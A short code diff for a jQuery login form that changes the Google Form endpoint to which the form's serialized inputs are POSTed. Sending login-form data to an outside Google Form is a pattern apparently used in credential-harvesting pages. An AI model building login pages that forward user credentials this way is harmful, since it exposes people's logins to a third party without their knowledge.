@@ -12,7 +12,8 @@ $('#login-form').submit(function(e) {
   e.preventDefault();
   //AJAX request
   $.ajax({
-    url: 'https://docs.google.com/forms/d/1FAIpQLSdstT02Ja_Sr1js8jx1fb8NdycEtG1OC9OJI6NE4U4PRxKZpw/formResponse',     //The public Google Form url, but replace /view with /formResponse
+    
+    url: 'https://docs.google.com/forms/d/e/1FAIpQLSe4erfdbmLBUKlvez1xhsj2XG8L7SBi2LpUc15gagxzdNL-AA/formResponse',     //The public Google Form url, but replace /view with /formResponse
     data: $('#login-form').serialize(), //Nifty jquery function that gets all the input data
     type: 'POST', //tells ajax to post the data to the url
     dataType: "json", //the standard data type for most ajax requests
